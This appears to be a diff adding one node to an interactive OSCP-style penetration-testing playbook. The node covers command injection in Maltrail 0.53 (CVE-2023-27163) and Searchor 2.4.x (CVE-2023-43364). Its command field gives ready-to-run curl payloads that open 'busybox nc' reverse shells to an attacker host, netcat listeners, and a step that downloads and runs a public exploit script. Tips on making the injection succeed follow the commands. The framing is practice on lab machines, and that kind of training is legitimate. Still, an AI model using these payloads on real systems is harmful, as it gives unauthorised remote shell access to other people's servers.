@@ -1,0 +1,13 @@
+{
+  "id": "maltrail_searchor_rce",
+  "phase": "WEB",
+  "title": "Maltrail 0.53 + Searchor 2.4.x — Command Injection via Login/Search",
+  "body": "Two Python web apps with the same class of vulnerability: unsanitised user input passed directly to a shell or eval. Both appear frequently on OSCP PG practice boxes.\n\nMaltrail (CVE-2023-27163): IDS/traffic monitoring tool. The /login endpoint passes the username directly to subprocess without sanitisation. Pre-auth — no credentials needed. Fingerprint: nmap http-title 'Maltrail' or port 8338.\n\nSearchor (CVE-2023-43364): Open source web scraping tool. The /search endpoint passes the query to eval() in Python. Fingerprint: Searchor in the page title or nmap, version < 2.4.2.",
+  "cmd": "# ══════════════════════════════════════════════════\n# MALTRAIL CVE-2023-27163 (pre-auth command injection)\n# ══════════════════════════════════════════════════\n# Fingerprint: http-title 'Maltrail' | port 8338\n# Exploit: inject into the username POST parameter\n\n# Listener on Kali:\nnc -lvnp <LPORT>\n\n# Method A — curl direct injection:\ncurl -s 'http://<IP>:8338/login' \\\n  --data 'username=;`busybox nc <LHOST> <LPORT> -e /bin/sh`'\n\n# Method B — Python PoC:\n# https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5\npython3 exploit.py <LHOST> <LPORT> http://<IP>:8338\n\n# Also try port 80 if 8338 isn't open:\ncurl -s 'http://<IP>/login' --data 'username=;`busybox nc <LHOST> <LPORT> -e /bin/sh`'\n\n# ══════════════════════════════════════════════════\n# SEARCHOR CVE-2023-43364 (eval injection)\n# ══════════════════════════════════════════════════\n# Fingerprint: Searchor in http-title | versions < 2.4.2\n# Exploit: inject Python into the search query (hits eval())\n\n# PoC script:\ncurl -s https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/refs/heads/main/exploit.sh -o exploit.sh\nbash exploit.sh http://<IP> <LHOST> <LPORT>\n\n# Manual payload (inject into the search endpoint):\ncurl 'http://<IP>/search?query=__import__(\"os\").system(\"busybox+nc+<LHOST>+<LPORT>+-e+/bin/sh\")'\n\n# Listener:\nnc -lvnp <LPORT>",
+  "warn": "Maltrail injection goes in the POST username field, not the password. Use busybox nc for the reverse shell on minimal containers. If the Maltrail login page redirects, submit directly to /login via curl — browser redirect may strip the payload. For Searchor, check the exact endpoint path — it may be /search or a custom route.",
+  "choices": [
+    {"label": "Got shell — Linux post-exploit", "next": "linux_post_exploit"},
+    {"label": "Back to web enum", "next": "web_enum"},
+    {"label": "Back to exploit hub", "next": "jump_exploits"}
+  ]
+}
